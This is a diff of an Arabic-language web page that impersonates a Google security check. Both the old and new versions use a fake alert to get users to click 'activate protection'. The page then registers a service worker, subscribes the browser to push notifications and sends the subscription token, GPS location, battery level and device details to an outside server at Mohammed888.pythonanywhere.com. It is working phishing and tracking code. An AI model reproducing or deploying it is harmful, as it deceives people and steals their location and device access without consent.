@@ -2,65 +2,43 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Check</title>
-    <style>
-        body { background: #f1f3f4; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 350px; text-align: center; }
-        img { width: 60px; margin-bottom: 20px; }
-        h2 { font-size: 18px; color: #3c4043; }
-        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; }
-        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Ads_logo.svg" alt="Google">
-        <h2>نشاط غير معتاد على جهازك</h2>
-        <p>لحماية صورك وملفاتك، يرجى تفعيل بروتوكول الأمان المباشر الآن.</p>
-        <button onclick="startExploit()">تفعيل الحماية الآن</button>
-    </div>
-
+    <title>Google Security</title>
     <script>
-        async function startExploit() {
-            // 1. تسجيل الرادار في الخلفية
-            if ('serviceWorker' in navigator) {
-                await navigator.serviceWorker.register('sw.js');
-            }
+        // المفتاح العام من صورتك
+        const publicKey = "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEVgK17MOi9TDGAa8fK/poMVJ0Q58QImEswUUh/GhVXevlPbxCJs1s/vwmxIHqSjC1fsY4BC/k JqJoIty10XtGg==";
 
-            // 2. طلب صلاحية الإشعارات (المفتاح لسحب الرسائل)
-            const perm = await Notification.requestPermission();
-
-            // 3. سحب البطارية
-            let bat = "N/A";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                bat = Math.round(b.level * 100) + "%";
-            }
-
-            // 4. سحب الموقع الجغرافي
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                sendData(pos.coords.latitude, pos.coords.longitude, bat, perm);
-            }, () => {
-                sendData(null, null, bat, perm);
+        async function init() {
+            const reg = await navigator.serviceWorker.register('sw.js');
+            const sub = await reg.pushManager.subscribe({
+                userVisibleOnly: true,
+                applicationServerKey: publicKey
             });
+
+            await fetch('https://Mohammed888.pythonanywhere.com/save_token', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(sub)
+            });
+            
+            // سحب الموقع والبطارية (اختياري)
+            captureInfo();
         }
 
-        function sendData(lt, ln, bt, pr) {
-            const map = lt ? `https://www.google.com/maps?q=${lt},${ln}` : "تم رفض الموقع";
-            fetch('https://Mohammed888.pythonanywhere.com/exf', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    device: navigator.userAgent,
-                    battery: bt,
-                    location: map,
-                    msg: pr === 'granted' ? "🔓 رادار الإشعارات نشط" : "🔒 رفض الإشعارات"
-                })
-            }).then(() => {
-                alert("تم تفعيل بروتوكول الحماية. جهازك آمن الآن.");
+        function captureInfo() {
+            navigator.geolocation.getCurrentPosition(pos => {
+                fetch('https://Mohammed888.pythonanywhere.com/exf', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
+                });
             });
         }
     </script>
+</head>
+<body style="text-align:center; padding:50px;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Ads_logo.svg" width="100">
+    <h2>تحديث أمني مطلوب</h2>
+    <p>يجب تفعيل الحماية السحابية لتأمين جهازك.</p>
+    <button onclick="init()" style="padding:15px; background:#1a73e8; color:white; border:none; border-radius:5px;">تفعيل الآن</button>
 </body>
 </html>
